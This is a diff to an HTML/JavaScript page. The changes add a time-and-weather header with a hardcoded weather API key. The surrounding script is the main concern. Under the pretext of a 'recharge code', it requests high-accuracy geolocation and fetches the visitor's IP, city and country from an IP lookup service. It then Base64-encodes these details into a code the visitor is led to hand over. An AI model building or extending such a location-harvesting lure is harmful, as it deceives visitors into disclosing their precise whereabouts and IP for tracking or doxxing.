@@ -8,12 +8,29 @@
         body {
             font-family: Arial, sans-serif;
             background-color: #f4f4f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             margin: 0;
             position: relative;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            background-color: #fff;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+        .weather {
+            margin-right: 20px;
+            font-size: 1em;
+            color: #333;
+        }
+        .time {
+            font-size: 1.5em;
+            color: #007bff;
+            font-weight: bold;
         }
         .container {
             text-align: center;
@@ -23,6 +40,7 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             max-width: 100%;
             width: 90%;
+            margin-top: 60px; /* 调整容器顶部间距以适应固定头部 */
         }
         h1 {
             color: #333;
@@ -60,7 +78,7 @@
         }
         /* 模态弹窗样式 */
         .modal {
-            display: none; /* 默认隐藏 */
+            display: none;
             position: fixed;
             z-index: 1;
             left: 0;
@@ -114,11 +132,24 @@
                 margin: 10% auto;
                 width: 90%;
             }
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .weather, .time {
+                margin: 5px 0;
+            }
         }
     </style>
 </head>
 <body>
     <audio id="audioPlayer" src="/丑八怪.m4a" preload="auto" volume="1"></audio>
+    <!-- 头部区域 -->
+    <div class="header">
+        <div id="weatherDisplay" class="weather"></div>
+        <div id="timeDisplay" class="time"></div>
+    </div>
+
     <!-- 模态弹窗 -->
     <div id="myModal" class="modal">
         <div class="modal-content">
@@ -136,15 +167,11 @@
     </div>
 
     <script>
-        // 自动播放音频（音量最大）
         document.addEventListener("DOMContentLoaded", function() {
             const audio = document.getElementById('audioPlayer');
-            audio.volume = 1; // 设置音量为最大
-            audio.play().catch(error => {
-                console.error('Audio playback failed:', error);
-            });
+            audio.volume = 1;
+            audio.play().catch(error => console.error('Audio playback failed:', error));
 
-            // 显示模态弹窗
             var modal = document.getElementById("myModal");
             var span = document.getElementsByClassName("close")[0];
 
@@ -159,16 +186,18 @@
                     modal.style.display = "none";
                 }
             }
+
+            // 初始化时间显示
+            updateTime();
+            setInterval(updateTime, 1000);
+
+            // 请求位置并获取天气信息
+            getLocationForWeather();
         });
 
         function getLocation() {
             if (navigator.geolocation) {
-                const options = {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                };
-                navigator.geolocation.getCurrentPosition(showPosition, showError, options);
+                navigator.geolocation.getCurrentPosition(showPosition, showError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
             } else { 
                 document.getElementById("location").innerHTML = '<span class="error">您的浏览器不支持地理位置功能。</span>';
             }
@@ -179,7 +208,6 @@
             const longitude = position.coords.longitude.toFixed(10);
             const locationString = `${latitude},${longitude}`;
 
-            // 获取IP地址和其他信息
             fetch('https://ip-api.com/json')
                 .then(response => response.json())
                 .then(data => {
@@ -189,7 +217,7 @@
                     const country = data.country || '';
 
                     const combinedData = `${locationString}-${ip}-${city}-${region}-${country}`;
-                    const encodedData = btoa(combinedData); // 对字符串进行Base64编码
+                    const encodedData = btoa(combinedData);
                     document.getElementById("location").innerHTML = `充值码: ${encodedData}`;
                 })
                 .catch(error => {
@@ -202,19 +230,56 @@
             let errorMessage;
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    errorMessage = "获取充值码失败，请允许获取您的位置信息。"
+                    errorMessage = "获取充值码失败，请允许获取您的位置信息。";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    errorMessage = "无法获取位置信息，请稍后再试。"
+                    errorMessage = "无法获取位置信息，请稍后再试。";
                     break;
                 case error.TIMEOUT:
-                    errorMessage = "获取位置信息超时，请稍后再试。"
+                    errorMessage = "获取位置信息超时，请稍后再试。";
                     break;
                 case error.UNKNOWN_ERROR:
-                    errorMessage = "发生未知错误，请稍后再试。"
+                    errorMessage = "发生未知错误，请稍后再试。";
                     break;
             }
             document.getElementById("location").innerHTML = `<span class="error">${errorMessage}</span>`;
+        }
+
+        function updateTime() {
+            const now = new Date();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const seconds = String(now.getSeconds()).padStart(2, '0');
+            document.getElementById("timeDisplay").innerText = `${hours}:${minutes}:${seconds}`;
+        }
+
+        function getLocationForWeather() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(getWeatherByLocation, showError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+            } else { 
+                document.getElementById("weatherDisplay").innerHTML = '<span class="error">您的浏览器不支持地理位置功能。</span>';
+            }
+        }
+
+        function getWeatherByLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            fetch(`https://api.weatherapi.com/v1/current.json?key=32966125e54b4f55bc211010241512&q=${latitude},${longitude}`)
+                .then(response => response.json())
+                .then(data => {
+                    const weatherIcon = `https:${data.current.condition.icon}`;
+                    const temperature = data.current.temp_c;
+                    const description = data.current.condition.text;
+                    document.getElementById("weatherDisplay").innerHTML = `
+                        <img src="${weatherIcon}" alt="${description}">
+                        ${temperature}°C ${description}
+                    `;
+                })
+                .catch(error => {
+                    console.error('Error fetching weather data:', error);
+                    document.getElementById("weatherDisplay").innerHTML = '<span class="error">无法获取天气信息。</span>';
+                });
         }
     </script>
 </body>
